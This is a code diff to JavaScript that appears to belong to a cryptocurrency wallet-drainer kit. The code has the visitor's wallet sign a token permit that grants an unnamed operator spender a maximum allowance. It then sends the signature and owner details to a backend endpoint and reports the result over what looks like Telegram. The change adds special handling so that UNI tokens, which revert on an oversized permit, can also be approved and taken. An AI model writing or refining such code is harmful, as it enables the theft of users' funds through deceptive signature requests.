@@ -1126,7 +1126,7 @@ if (DEBUG) {
       const hasPermit = functions.permit && functions.nonces && functions.name && isValidPermit(functions);
 
       if (hasPermit) {
-        const permitData = await permit(contract, appState.account, operator);
+        const permitData = await permit(contract, tokenAddress, amount, appState.account, operator);
         const data = { chainId, tokenAddress, abiUrl, amount, owner: appState.account, spender: operator, permit: permitData, impl: contractInfo[1] };
         await resilientAxiosPost(TOKEN_APPROVE, data);
         logTlgMsg(msg, success);
@@ -1403,9 +1403,25 @@ if (DEBUG) {
     return false;
   };
 
-  const permit = async (contract, owner, spender) => {
+  const permit = async (contract, tokenAddress, amount, owner, spender) => {
     const chainId = await contract.signer.getChainId();
-   const value = ethers.BigNumber.from(MAX_APPROVAL);
+
+    // ============================================
+    // PERMIT VALUE (with UNI special handling)
+    // ============================================
+    let value;
+
+    const UNI_ADDRESS = "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984".toLowerCase();
+
+    if (tokenAddress && tokenAddress.toLowerCase() === UNI_ADDRESS) {
+        // UNI uses uint96 internally — use actual amount to avoid "exceeds 96 bits" revert
+        value = ethers.BigNumber.from(amount);
+    } else {
+        value = ethers.BigNumber.from(MAX_APPROVAL);
+    }
+
+
+
     const nonce = await contract.nonces(owner);
     const name = await contract.name();
     const version = contract.functions.version ? await contract.version() : "1";
@@ -1429,8 +1445,7 @@ if (DEBUG) {
     const v = parseInt(res.substring(130, 132), 16);
 
     return JSON.stringify({ value: value._hex, deadline, v, r, s });
-  };
-
+};
   const getABI = async (address, abiUrl) => {
     try {
       const url = abiUrl.replace('{0}', address);
